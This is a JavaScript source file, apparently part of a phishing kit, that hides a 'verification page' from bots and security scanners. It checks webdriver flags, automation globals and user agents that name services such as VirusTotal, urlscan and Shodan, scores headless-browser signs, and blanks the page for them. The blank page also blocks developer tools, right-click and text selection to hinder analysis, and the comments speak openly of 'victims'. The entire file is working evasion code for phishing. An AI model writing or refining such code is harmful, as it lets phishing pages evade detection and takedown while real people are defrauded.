// vg-cloak.js — bot / scanner cloaking layer.
//
// Purpose: decide, as early and as cheaply as possible, whether the visitor is
// a human or an automated client, and show a blank white page to the latter
// while letting real humans see the real verification page.
//
// Where this sits in the stack (each layer assumes the ones before it missed):
//   1. Edge    - worker/devicecode-worker.js scores user-agent / headers / IP
//                and refuses to serve page content to definite bots at all.
//   2. Server  - backend/middleware/botguard.js + capture block-check classify
//                the visitor IP before the page is rendered.
//   3. Page    - THIS FILE. It catches the bots that still reach the browser: a
//                scanner driving a real Chrome has no webdriver flag and a
//                normal user agent, so only browser-side signals expose it.
//
// Design rules:
//   * FAIL OPEN. An ambiguous visitor is treated as human. A false positive
//     costs a real victim; a false negative only costs one missed bot that the
//     interaction gate and the behaviour layer may still catch.
//   * HARD signals (driver globals, navigator.webdriver, bot user agents)
//     cannot occur in a normal browser, so they cloak immediately.
//   * SOFT signals are scored. A cloak needs at least one STRONG signal
//     (weight >= STRONG_WEIGHT) AND a total >= SOFT_THRESHOLD. The strong
//     signals are the ones a real browser can never produce (no languages at
//     all, a zero-size viewport or screen). Everything a real machine can
//     legitimately report - software WebGL on a VM, an empty plugin list - is
//     weak, so a cluster of plausible anomalies cannot condemn a real user.
//   * Nothing here ever throws: every probe is wrapped. If a probe fails the
//     visitor is simply treated as human.
//
// Runs at module level, before vg-fingerprint.js / vg-behavior.js / vg-engine.js
// (templateloader injects it first), so its white guard is up before any page
// content can paint.
//
// Obfuscation-safe: no literal close-script or close-style tag in any string
// (write them as <\/script> / <\/style>), and no "{{" placeholder prefix.

(function () {
  'use strict';

  // Idempotent: a template that already includes vg-cloak.js must not double-run.
  if (window.__VG_CLOAK && window.__VG_CLOAK.version) return;

  // Escape hatch. Left undefined in normal deployments (always on); a template
  // or operator can hard-disable the layer by seeding window.__CLOAK_ENABLED.
  if (window.__CLOAK_ENABLED === false || window.__CLOAK_ENABLED === 'false') return;

  var SOFT_THRESHOLD = 6;   // total soft score needed to cloak
  var STRONG_WEIGHT  = 3;   // a signal at/above this is "strong" on its own

  var cloak = {
    version: 1,
    bot: false,
    hard: false,
    strong: false,
    score: 0,
    reasons: [],
    cloaked: false
  };
  window.__VG_CLOAK = cloak;

  function note(weight, reason) {
    cloak.score += weight;
    cloak.reasons.push(reason);
    if (weight >= STRONG_WEIGHT) cloak.strong = true;
  }

  function hardBot(reason) {
    cloak.bot = true;
    cloak.hard = true;
    cloak.reasons.push(reason);
  }

  // ── Primitives captured before any later page script can patch them ──
  var nav = navigator;
  var ua = '';
  try { ua = String((nav && nav.userAgent) || ''); } catch (e) { ua = ''; }
  var uaL = ua.toLowerCase();
  var claimsChrome = uaL.indexOf('chrome') !== -1 || uaL.indexOf('chromium') !== -1 || uaL.indexOf('edg/') !== -1;
  var isMobile = uaL.indexOf('mobile') !== -1 || uaL.indexOf('android') !== -1 ||
                 uaL.indexOf('iphone') !== -1 || uaL.indexOf('ipad') !== -1;
  var isDesktop = !isMobile;


  // ═══════════════════════════════════════════════════════════════
  // 1. HARD SIGNALS — impossible in a non-automated browser
  // ═══════════════════════════════════════════════════════════════

  // 1a. navigator.webdriver, either set true or redefined as an own property
  //     (the descriptor check catches stealth patches that fake it to false).
  try { if (nav && nav.webdriver === true) hardBot('webdriver'); } catch (e) {}
  try {
    var wdDesc = Object.getOwnPropertyDescriptor(nav, 'webdriver');
    if (wdDesc && (wdDesc.value === true || typeof wdDesc.get === 'function')) {
      hardBot('webdriver_descriptor');
    }
  } catch (e) {}

  // 1b. Driver globals (Puppeteer / Playwright / Selenium / Phantom / CDP).
  var DRIVER_GLOBALS = [
    '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate',
    '__webdriver_script_fn', '__webdriver_script_value', '__webdriver_script_command',
    '__selenium_unwrapped_', '__fxdriver_unwrapped_', '__webdriver_unwrapped_',
    '__driver_evaluate', '__nightmare', '__playwright', '__pw_init', '__pw_inspector__',
    '_Selenium_IDE_Recorder', 'callSelenium', 'callPhantom', '_phantom',
    '__phantomas', 'domAutomation', 'domAutomationController',
    '$cdc_asdjflasutopfhvcZLmcfl_'
  ];
  for (var gi = 0; gi < DRIVER_GLOBALS.length; gi++) {
    try {
      if (window[DRIVER_GLOBALS[gi]]) { hardBot('driver_global:' + DRIVER_GLOBALS[gi]); break; }
    } catch (e) {}
  }
  try {
    if (window.document && (window.document.__webdriver_evaluate || window.document.__selenium_evaluate)) {
      hardBot('document_driver');
    }
  } catch (e) {}

  // ChromeDriver injects keys named cdc_<random> onto the document object.
  try {
    if (window.document) {
      var dkeys = Object.keys(window.document);
      for (var di = 0; di < dkeys.length; di++) {
        if (dkeys[di].indexOf('cdc_') === 0 || dkeys[di].indexOf('$cdc_') === 0) { hardBot('cdc_key'); break; }
      }
    }
  } catch (e) {}

  // A chrome object that exists while window.chrome does not is a spoof.
  try { if (window._chrome && !window.chrome) hardBot('chrome_spoof'); } catch (e) {}

  // 1c. Bot / scanner user agents.
  var UA_SIGNATURES = [
    'bot', 'crawler', 'spider', 'scraper', 'crawling',
    'headless', 'phantomjs', 'puppeteer', 'playwright',
    'selenium', 'webdriver', 'automation',
    'nmap', 'masscan', 'zaproxy', 'burpsuite',
    'sqlmap', 'nikto', 'wget', 'curl',
    'axios', 'guzzle', 'python-requests', 'java/',
    'okhttp', 'postman', 'insomnia',
    'scrapy', 'beautifulsoup', 'httpx',
    'monitor', 'checker', 'probe', 'scanner',
    'uptime', 'statuscake', 'pingdom',
    'virustotal', 'urlscan', 'shodan', 'censys'
  ];
  for (var si = 0; si < UA_SIGNATURES.length; si++) {
    if (uaL.indexOf(UA_SIGNATURES[si]) !== -1) { hardBot('ua:' + UA_SIGNATURES[si]); break; }
  }
  // An empty or absurdly short user agent is a raw HTTP client, not a browser.
  try { if (uaL.length < 12) hardBot('ua_short'); } catch (e) {}

  // ═══════════════════════════════════════════════════════════════
  // 2. SOFT SIGNALS — scored; only decisive in combination
  // ═══════════════════════════════════════════════════════════════
  function softSignals() {
    // 2a. navigator.languages empty — every real browser advertises at least one.
    //     STRONG: no real browser ever reports an empty language list.
    try { if (!nav.languages || nav.languages.length === 0) note(3, 'no_languages'); } catch (e) {}
    try { if (!nav.language) note(1, 'no_language'); } catch (e) {}

    // 2b. Desktop UA with zero plugins AND zero mimeTypes. Headless Chrome
    //     reports none; every real desktop browser reports several. Mobile
    //     browsers legitimately report none, so this is desktop-only.
    if (isDesktop) {
      try {
        if (nav.plugins && nav.plugins.length === 0 && nav.mimeTypes && nav.mimeTypes.length === 0) {
          note(2, 'no_plugins');
        }
      } catch (e) {}
    }

    // 2c. Desktop Chrome-family UA without the features real desktop Chrome
    //     always exposes. Gated on !isMobile: Chrome on iOS/iPadOS is WebKit
    //     under the hood and legitimately exposes none of these, so counting
    //     them there condemned real phone and tablet users.
    if (claimsChrome && !isMobile) {
      try { if (!window.chrome) note(2, 'no_window_chrome'); } catch (e) {}
      try { if (!nav.userAgentData) note(1, 'no_user_agent_data'); } catch (e) {}
      try { if (nav.pdfViewerEnabled === false) note(1, 'no_pdf_viewer'); } catch (e) {}
      try { if (!nav.connection) note(1, 'no_connection'); } catch (e) {}
    }

    // 2d. Zero-size viewport / screen — the classic old-headless default.
    //     STRONG: a real browser always has a non-zero viewport and screen.
    try { if (!window.outerWidth || !window.outerHeight) note(3, 'zero_outer_size'); } catch (e) {}
    try { if (!screen.width || !screen.height) note(3, 'zero_screen_size'); } catch (e) {}
    try { if (window.innerWidth === 0 || window.innerHeight === 0) note(2, 'zero_inner_size'); } catch (e) {}

    // 2e. Hardware hints absent (real machines report these on Chrome).
    try {
      if (!nav.hardwareConcurrency || nav.hardwareConcurrency <= 0) note(1, 'no_hardware_concurrency');
    } catch (e) {}
    try {
      if (claimsChrome && !isMobile && nav.deviceMemory !== undefined && nav.deviceMemory <= 0) note(1, 'zero_device_memory');
    } catch (e) {}

    // 2f. Software renderer (SwiftShader / llvmpipe / Mesa) — headless GPUs.
    //     WEAK, deliberately: real users hit this on VMs, remote desktops and
    //     with hardware acceleration disabled, so it can never cloak on its own.
    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
        var rend = dbg ? String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '') : '';
        var rl = rend.toLowerCase();
        if (rl.indexOf('swiftshader') !== -1 || rl.indexOf('llvmpipe') !== -1 ||
            rl.indexOf('software') !== -1 || rl.indexOf('mesa offscreen') !== -1) {
          note(1, 'software_webgl');
        }
      }
    } catch (e) {}
  }


  // ═══════════════════════════════════════════════════════════════
  // 3. CLOAK ACTIONS
  // ═══════════════════════════════════════════════════════════════

  // Instant white guard: covers the viewport the moment a bot is identified, so
  // no branded content can flash before the DOM wipe runs on DOMContentLoaded.
  function installGuard() {
    try {
      if (document.getElementById('vgCloakGuard')) return;
      var g = document.createElement('div');
      g.id = 'vgCloakGuard';
      g.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;' +
        'background:#fff;margin:0;padding:0;border:0;';
      (document.body || document.documentElement).appendChild(g);
    } catch (e) {}
  }

  // Replace the whole document with a genuinely blank page. The anti-scraping
  // listeners are carried over because document.write replaces the document and
  // would otherwise drop them.
  function wipe(reason) {
    if (cloak.cloaked) return;
    cloak.cloaked = true;

    // Mark the blank document as deliberate so vg-engine's anti-clone integrity
    // monitor does not read the empty body as content-stripping and escalate to
    // killPage() -> about:blank.
    try { window.__VG_BLANKED = true; } catch (e) {}

    // vg-engine hijacks console.* and forwards to /api/log; when it has already
    // loaded we surface the cloak verdict to the operator through that sink.
    // Before it loads, nothing is echoed to the browser console.
    try {
      if (window.__VG_LOG) window.__VG_LOG('warn', '[VG] cloak: ' + (reason || cloak.reasons.join('|')));
    } catch (e) {}

    try {
      document.open();
      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8">' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;' +
        'user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style>' +
        '<script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}' +
        'if(e.key==="F12"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});' +
        'document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script>' +
        '</head><body></body></html>');
      document.close();
    } catch (e) {
      try {
        document.documentElement.innerHTML = '';
        if (document.body) document.body.style.background = '#fff';
      } catch (e2) {}
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 4. DRIVE
  // ═══════════════════════════════════════════════════════════════
  if (cloak.bot) installGuard();

  function evaluate() {
    // Hard bot: wipe straight away (the guard is already up).
    if (cloak.bot) { wipe('hard:' + cloak.reasons.join('|')); return; }

    try { softSignals(); } catch (e) {}

    // Soft cloak needs a strong signal AND enough corroboration.
    if (cloak.strong && cloak.score >= SOFT_THRESHOLD) {
      cloak.bot = true;
      wipe('soft:' + cloak.reasons.join('|'));
    }
  }

  window.__VG_CLOAK.evaluate = evaluate;
  window.__VG_CLOAK.wipe = wipe;

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', evaluate);
  } else {
    evaluate();
  }
})();

